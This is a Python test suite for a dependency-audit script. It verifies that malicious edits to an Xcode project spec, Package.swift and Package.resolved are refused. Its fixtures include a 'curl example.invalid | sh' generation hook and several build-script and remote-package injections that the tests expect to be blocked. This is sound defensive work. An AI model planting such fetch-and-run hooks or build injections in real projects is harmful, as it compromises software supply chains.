""".github/scripts/assert-no-dependencies.sh (`mise run audit:dependencies`), run as it is in a scratch copy of the files
it reads, with a stand-in `swift` that answers `swift package dump-package`.

Its checks of Apps/project.yml were four `grep`s. An end-to-end audit (docs/06-adversarial-review.md Z103) wrote a
spec with each of the things below in it and none was reported: shell at generation and at build time, files no check
reads, native sources from outside Apps/, a remote package in flow style, and the memory-safety setting quoted or
simply deleted. The spec is now parsed and held to an allowlist (.github/scripts/yaml-audit.py); every case is a
test. The manifest half (Z104) is here too: a Package.swift that reads its environment, or puts a target back in
the Swift 5 language mode."""

import json
import os
import shutil
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import support  # noqa: E402

SCRIPT = os.path.join(support.ROOT, ".github", "scripts", "assert-no-dependencies.sh")
CRYPTO = {
    "sourceControl": [
        {
            "identity": "swift-crypto",
            "location": {"remote": [{"urlString": "https://github.com/apple/swift-crypto.git"}]},
            "requirement": {"exact": ["4.5.2"]},
        }
    ]
}

# `swift package dump-package`: prints $STUB_MANIFEST.
FAKE_SWIFT = r"""#!/usr/bin/env python3
import os, sys
assert sys.argv[1:] == ["package", "dump-package"], sys.argv
sys.stdout.write(open(os.environ["STUB_MANIFEST"], encoding="utf-8").read())
"""


def manifest(**changes):
    """What `swift package dump-package` prints for a manifest the script accepts, with changes laid over it."""
    target = {"name": "WatchwordModel", "type": "regular", "dependencies": [], "settings": []}
    return {"dependencies": [CRYPTO], "targets": [target], "swiftLanguageVersions": ["6"], **changes}


class TripwireTestCase(support.ScriptTestCase):
    def setUp(self):
        super().setUp()
        self.install("swift", FAKE_SWIFT)
        for name in ("Package.swift", "Package.resolved", os.path.join("Apps", "project.yml")):
            os.makedirs(os.path.dirname(self.path(name)), exist_ok=True)
            shutil.copy(os.path.join(support.ROOT, name), self.path(name))
        self.dump(manifest())

    def dump(self, document):
        self.write("manifest.json", json.dumps(document))

    def edit(self, name, old, new):
        """Replaces the one place old appears in the scratch copy of name."""
        with open(self.path(name), encoding="utf-8") as handle:
            text = handle.read()
        self.assertEqual(text.count(old), 1, f"{old!r} should appear once in {name}")
        self.write(name, text.replace(old, new))

    def run_script(self, *arguments):
        return self.run_process(["bash", SCRIPT, *arguments], STUB_MANIFEST=self.path("manifest.json"))

    def assert_refused(self, expected):
        result = self.run_script()
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn(expected, result.stdout)
        return result.stdout

    def assert_passes(self):
        result = self.run_script()
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)


class AppSpecTests(TripwireTestCase):
    SPEC = os.path.join("Apps", "project.yml")
    IOS_SOURCES = "    platform: iOS\n    sources:\n      - path: iOS\n"
    IOS_TARGET = "  Watchword-iOS:\n    templates: [WatchwordApp]\n"

    def spec(self, old, new):
        self.edit(self.SPEC, old, new)

    def append(self, text):
        with open(self.path(self.SPEC), "a", encoding="utf-8") as handle:
            handle.write(text)

    def test_the_repository_s_spec_passes(self):
        self.assert_passes()

    def test_shell_at_generation_time_is_refused(self):
        for key in ("preGenCommand", "postGenCommand"):
            with self.subTest(key=key):
                self.setUp()
                self.spec("options:\n", f"options:\n  {key}: curl example.invalid | sh\n")
                self.assert_refused(f"options.{key} is not permitted")

    def test_shell_at_build_time_is_refused(self):
        cases = {
            "a scheme's build pre-action": (
                "schemes:\n  Watchword-iOS:\n    build:\n",
                "schemes:\n  Watchword-iOS:\n    build:\n      preActions:\n        - script: echo hi\n",
                "schemes.Watchword-iOS.build.preActions is not permitted",
            ),
            "a scheme's test post-action": (
                "    test:\n      config: Debug\n      targets: [WatchwordUITests]\n",
                "    test:\n      config: Debug\n      targets: [WatchwordUITests]\n"
                "      postActions:\n        - script: echo hi\n",
                "schemes.Watchword-iOS.test.postActions is not permitted",
            ),
            "a scheme's archive action": (
                "schemes:\n  Watchword-iOS:\n",
                "schemes:\n  Watchword-iOS:\n    archive:\n      postActions:\n        - script: echo hi\n",
                "schemes.Watchword-iOS.archive is not permitted",
            ),
            "a legacy target": (
                self.IOS_TARGET,
                self.IOS_TARGET + "    legacy:\n      toolPath: /bin/sh\n      arguments: -c 'echo hi'\n",
                "targets.Watchword-iOS.legacy is not permitted",
            ),
        }
        for key in ("preBuildScripts", "postCompileScripts", "postBuildScripts", "buildScripts", "buildRules"):
            cases[key] = (
                self.IOS_TARGET,
                self.IOS_TARGET + f"    {key}:\n      - script: echo hi\n",
                f"targets.Watchword-iOS.{key} is not permitted",
            )
        cases["buildToolPlugins"] = (
            self.IOS_TARGET,
            self.IOS_TARGET + "    buildToolPlugins:\n      - plugin: Evil\n        package: Evil\n",
            "targets.Watchword-iOS.buildToolPlugins is not permitted",
        )
        for name, (old, new, expected) in cases.items():
            with self.subTest(case=name):
                self.setUp()
                self.spec(old, new)
                self.assert_refused(expected)

    def test_an_aggregate_target_s_scripts_are_refused(self):
        self.append("aggregateTargets:\n  Scripts:\n    buildScripts:\n      - script: echo hi\n")
        self.assert_refused("the spec.aggregateTargets is not permitted")

    def test_files_no_check_reads_are_refused(self):
        cases = {
            "include": "include:\n  - ../docs/extra.yml\n",
            "configFiles": "configFiles:\n  Release: ../x.xcconfig\n",
            "fileGroups": "fileGroups:\n  - ../docs\n",
            "projectReferences": "projectReferences:\n  Other:\n    path: ../Other.xcodeproj\n",
            "settingGroups": "settingGroups:\n  loose:\n    OTHER_SWIFT_FLAGS: -Xfrontend -disable-availability-checking\n",
        }
        for key, text in cases.items():
            with self.subTest(key=key):
                self.setUp()
                self.append(text)
                self.assert_refused(f"the spec.{key} is not permitted")
        self.setUp()
        self.spec(self.IOS_TARGET, self.IOS_TARGET + "    configFiles:\n      Release: ../x.xcconfig\n")
        self.assert_refused("targets.Watchword-iOS.configFiles is not permitted")

    def test_sources_from_outside_apps_are_refused(self):
        """A `.m` with a constructor under `../Support` would be compiled into the app and read by no tripwire."""
        for path in ("../docs/native", "../Sources/WatchwordKit", "/tmp/native", "Shared/../../docs", "~/native", "."):
            with self.subTest(path=path):
                self.setUp()
                self.spec(self.IOS_SOURCES, self.IOS_SOURCES + f"      - path: {path}\n")
                self.assert_refused("must be a path inside Apps/")
        self.setUp()
        self.spec("sources: [UITests/Shared, UITests/iOS,", "sources: [../docs/native, UITests/Shared, UITests/iOS,")
        self.assert_refused("must be a path inside Apps/")
        # A path's other attributes are how a file gets compiled as something else, or with flags of its own.
        self.setUp()
        self.spec(self.IOS_SOURCES, self.IOS_SOURCES + "        compilerFlags: -DDEBUG\n")
        self.assert_refused("sources[0].compilerFlags is not permitted")

    def test_the_one_file_from_outside_apps_is_named_exactly(self):
        self.spec(
            "../Tests/WatchwordPlatformTests/SystemKeychainStoreTests.swift", "../Tests/WatchwordPlatformTests"
        )
        self.assert_refused("must be a path inside Apps/")

    def test_any_package_but_the_repository_s_own_is_refused(self):
        own = "packages:\n  Watchword:\n    path: ..\n"
        cases = {
            "a remote package in flow style": own + "  Evil: {url: https://example.invalid/evil, from: 1.0.0}\n",
            "a remote package in block style": own + "  Evil:\n    url: https://example.invalid/evil\n    from: 1.0.0\n",
            "a GitHub shorthand": own + "  Evil:\n    github: evil/evil\n    exactVersion: 1.0.0\n",
            "a second local package": own + "  Vendored:\n    path: ../vendored\n",
            "a quoted key in flow style": own + '  Vendored: {"path": ../vendored}\n',
            "a quoted key in block style": own + '  Vendored:\n    "path": ../vendored\n',
            "the package moved": "packages:\n  Watchword:\n    path: ../vendored\n",
            "the package made remote": "packages:\n  Watchword:\n    url: https://example.invalid/watchword\n",
        }
        for name, text in cases.items():
            with self.subTest(case=name):
                self.setUp()
                self.spec(own, text)
                self.assert_refused("Apps/project.yml")

    def test_an_escaped_key_is_refused(self):
        self.spec(self.IOS_TARGET, self.IOS_TARGET + '    "preBuild\\x53cripts":\n      - script: echo hi\n')
        self.assert_refused("expected `key: value` with a plain key")

    def test_the_memory_safety_settings_must_be_present_and_on(self):
        """Finding: only a bare `NO` or `false` was refused, so `"NO"` in quotes passed, and so did deleting the line,
        after which nothing checks the app and extension code for unmarked unsafe constructs."""
        for setting in ("SWIFT_STRICT_MEMORY_SAFETY", "SWIFT_TREAT_WARNINGS_AS_ERRORS", "ENABLE_USER_SCRIPT_SANDBOXING"):
            for value in ('"NO"', "NO", "false", "'NO'", "no", '""', "[YES, NO]"):
                with self.subTest(setting=setting, value=value):
                    self.setUp()
                    self.spec(f"    {setting}: YES\n", f"    {setting}: {value}\n")
                    self.assert_refused(f"settings.base.{setting} must be YES")
            with self.subTest(setting=setting, value="deleted"):
                self.setUp()
                self.spec(f"    {setting}: YES\n", "")
                self.assert_refused(f"settings.base.{setting} is required")
        self.setUp()
        self.spec('    SWIFT_VERSION: "6.0"\n', '    SWIFT_VERSION: "5"\n')
        self.assert_refused("settings.base.SWIFT_VERSION must be")
        self.setUp()
        self.spec("    SWIFT_STRICT_CONCURRENCY: complete\n", "    SWIFT_STRICT_CONCURRENCY: minimal\n")
        self.assert_refused("settings.base.SWIFT_STRICT_CONCURRENCY must be complete")

    def test_a_target_cannot_set_what_the_project_requires(self):
        base = "    settings:\n      base:\n        TARGETED_DEVICE_FAMILY: \"1,2\"\n        INFOPLIST_KEY_UISupported"
        self.spec(base, base.replace("        TARGETED", "        SWIFT_STRICT_MEMORY_SAFETY: NO\n        TARGETED"))
        self.assert_refused("targets.Watchword-iOS.settings.base.SWIFT_STRICT_MEMORY_SAFETY is not a build setting")

    def test_compiler_linker_and_condition_settings_are_refused(self):
        for setting in (
            "OTHER_SWIFT_FLAGS: -Xfrontend -disable-availability-checking",
            "OTHER_LDFLAGS: -lz",
            "OTHER_CFLAGS: -DDEBUG",
            "SWIFT_OBJC_BRIDGING_HEADER: Shared/Bridge.h",
            "SWIFT_ACTIVE_COMPILATION_CONDITIONS: DEBUG",
            "GCC_PREPROCESSOR_DEFINITIONS: DEBUG=1",
            "SWIFT_OPTIMIZATION_LEVEL: -Onone",
            "HEADER_SEARCH_PATHS: ../docs",
        ):
            with self.subTest(setting=setting):
                self.setUp()
                self.spec("    DEAD_CODE_STRIPPING: YES\n", f"    DEAD_CODE_STRIPPING: YES\n    {setting}\n")
                self.assert_refused(f"settings.base.{setting.split(':')[0]} is not a build setting")

    def test_settings_for_one_configuration_are_refused(self):
        """How DEBUG, and with it the `--uitest` switch, would be defined for a Release build."""
        self.spec(
            "settings:\n  base:\n",
            "settings:\n  configs:\n    Release:\n      SWIFT_ACTIVE_COMPILATION_CONDITIONS: DEBUG\n  base:\n",
        )
        self.assert_refused("settings.configs is not permitted")
        self.setUp()
        self.append("configs:\n  Release: debug\n")
        self.assert_refused("the spec.configs is not permitted")

    def test_prebuilt_and_foreign_dependencies_are_refused(self):
        embedded = "    dependencies:\n      - target: AutoFillExtension-iOS\n        embed: true\n"
        for dependency in (
            "      - framework: Vendor/Evil.framework\n",
            "      - sdk: libz.tbd\n",
            "      - carthage: Evil\n",
            "      - bundle: Evil.bundle\n",
            "      - package: Evil\n        product: Evil\n",
            "      - package: Watchword\n        product: WatchwordTestSupport\n",
            "      - package: Watchword\n",
            "      - target: Nowhere\n",
            "      - target: AutoFillExtension-iOS\n        link: false\n",
        ):
            with self.subTest(dependency=dependency.strip()):
                self.setUp()
                self.spec(embedded, embedded + dependency)
                self.assert_refused("targets.Watchword-iOS.dependencies[1]")

    def test_a_value_taken_from_the_environment_is_refused(self):
        self.spec("  bundleIdPrefix: com.ericsuh\n", "  bundleIdPrefix: ${BUNDLE_PREFIX}\n")
        self.assert_refused("expanded from the environment when the project is generated")

    def test_other_kinds_of_target_are_refused(self):
        for kind in ("tool", "framework", "library.dynamic", "bundle", "xpc-service", "[application, tool]"):
            with self.subTest(kind=kind):
                self.setUp()
                self.spec("  WatchwordKeychainHost:\n    type: application\n", f"  WatchwordKeychainHost:\n    type: {kind}\n")
                self.assert_refused("targets.WatchwordKeychainHost.type")

    def test_a_spec_the_reader_cannot_read_is_refused(self):
        for name, old, new in (
            ("an anchor", "options:\n", "options: &options\n"),
            ("a tab", "name: Watchword\n", "name:\tWatchword\n"),
            ("a duplicate key", "name: Watchword\n", "name: Watchword\nname: Other\n"),
            ("a document marker", "name: Watchword\n", "---\nname: Watchword\n"),
        ):
            with self.subTest(case=name):
                self.setUp()
                self.spec(old, new)
                self.assert_refused("reads a subset of YAML")


class ManifestTests(TripwireTestCase):
    def test_a_manifest_as_the_repository_has_it_passes(self):
        self.assert_passes()

    def test_a_manifest_that_reads_its_environment_is_refused(self):
        """Finding: the structural checks read `swift package dump-package`, which is what the manifest evaluates to
        on the machine running the audit. One that adds a dependency only when GITHUB_ACTIONS is unset shows CI a
        clean dump."""
        anchor = "import PackageDescription\n"
        for name, addition, expected in (
            ("Context.environment", 'let ci = Context.environment["GITHUB_ACTIONS"] != nil\n', "must not depend on"),
            ("ProcessInfo", "import Foundation\nlet ci = ProcessInfo.processInfo.environment\n", "nothing else"),
            ("getenv", 'let ci = getenv("GITHUB_ACTIONS") != nil\n', "must not depend on"),
            ("an alias for Context", 'typealias Where = Context\nlet ci = Where.environment["CI"]\n', "must not depend on"),
            ("the checkout's path", 'let runner = #filePath.hasPrefix("/Users/runner")\n', "must not depend on"),
            ("how it was invoked", "let arguments = CommandLine.arguments\n", "must not depend on"),
            ("chance", "let sometimes = Bool.random()\n", "must not depend on"),
            ("a platform conditional", "#if os(Linux)\nlet linux = true\n#endif\n", "must not depend on"),
            ("canImport", "#if canImport(Darwin)\nlet apple = true\n#endif\n", "must not depend on"),
            ("another import", "import Foundation\n", "nothing else"),
            ("an attributed import", "@preconcurrency import Foundation\n", "nothing else"),
            ("an indented import", "  import class Foundation.ProcessInfo\n", "nothing else"),
        ):
            with self.subTest(case=name):
                self.setUp()
                self.edit("Package.swift", anchor, anchor + addition)
                self.assert_refused(expected)

    def test_a_comment_may_mention_them(self):
        anchor = "import PackageDescription\n"
        self.edit("Package.swift", anchor, anchor + "// Not `#if os(Linux)`, and no Context.environment: one value.\n")
        self.assert_passes()

    def test_swift_5_language_mode_is_refused(self):
        """It turns off the data-race checking the actors' invariants rest on."""
        self.dump(manifest(swiftLanguageVersions=["5"]))
        self.assert_refused("swiftLanguageModes must be [.v6]")
        self.dump(manifest(swiftLanguageVersions=["6", "5"]))
        self.assert_refused("swiftLanguageModes must be [.v6]")
        self.dump(manifest(swiftLanguageVersions=None))
        self.assert_refused("swiftLanguageModes must be [.v6]")
        target = {"name": "WatchwordKit", "type": "regular", "dependencies": []}
        target["settings"] = [{"tool": "swift", "kind": {"swiftLanguageMode": {"_0": "5"}}}]
        self.dump(manifest(targets=[target]))
        self.assert_refused("WatchwordKit: setting swiftLanguageMode is not permitted")

    def test_the_checks_that_were_there_still_hold(self):
        other = json.loads(json.dumps(CRYPTO))
        other["sourceControl"][0]["location"]["remote"][0]["urlString"] = "https://example.invalid/evil.git"
        self.dump(manifest(dependencies=[CRYPTO, other]))
        self.assert_refused("only one package dependency is allowed")
        target = {"name": "Native", "type": "binary", "dependencies": [], "settings": []}
        self.dump(manifest(targets=[target]))
        self.assert_refused("Native: target type binary is not permitted")


class ResolvedFileTests(TripwireTestCase):
    """`--resolved-file`: one Package.resolved against the allowed commits, for the file Xcode writes."""

    def resolved(self, edit=None):
        with open(os.path.join(support.ROOT, "Package.resolved"), encoding="utf-8") as handle:
            document = json.load(handle)
        if edit:
            edit(document)
        return self.write("Xcode.resolved", json.dumps(document))

    def test_the_committed_pins_pass(self):
        result = self.run_script("--resolved-file", self.resolved())
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn("pins the allowed swift-crypto commits and nothing else", result.stdout)

    def test_any_other_resolution_fails(self):
        def moved_tag(document):
            document["pins"][0]["state"]["revision"] = "0" * 40

        def extra(document):
            document["pins"].append({"identity": "swift-evil", "state": {"revision": "1" * 40}})

        def fewer(document):
            document["pins"].pop()

        def twice(document):
            document["pins"].append(dict(document["pins"][0], state={"revision": "2" * 40}))

        def branch(document):
            document["pins"][0]["state"] = {"branch": "main"}

        for edit in (moved_tag, extra, fewer, twice, branch):
            with self.subTest(case=edit.__name__):
                result = self.run_script("--resolved-file", self.resolved(edit))
                self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
                self.assertIn("::error file=", result.stdout)

    def test_a_missing_or_unreadable_file_fails(self):
        result = self.run_script("--resolved-file", self.path("nowhere", "Package.resolved"))
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn("is missing", result.stdout)
        for text in ("", "not json", "[]", '{"pins": 3}', '{"object": {"pins": []}}', '{"pins": [{"identity": "x"}]}'):
            with self.subTest(text=text):
                result = self.run_script("--resolved-file", self.write("Broken.resolved", text))
                self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
                self.assertIn("::error", result.stdout)

    def test_the_option_needs_its_file(self):
        self.assertEqual(self.run_script("--resolved-file").returncode, 2)
        self.assertEqual(self.run_script("--resolved-file", "").returncode, 2)
        self.assertEqual(self.run_script("--something-else").returncode, 2)


if __name__ == "__main__":
    unittest.main()
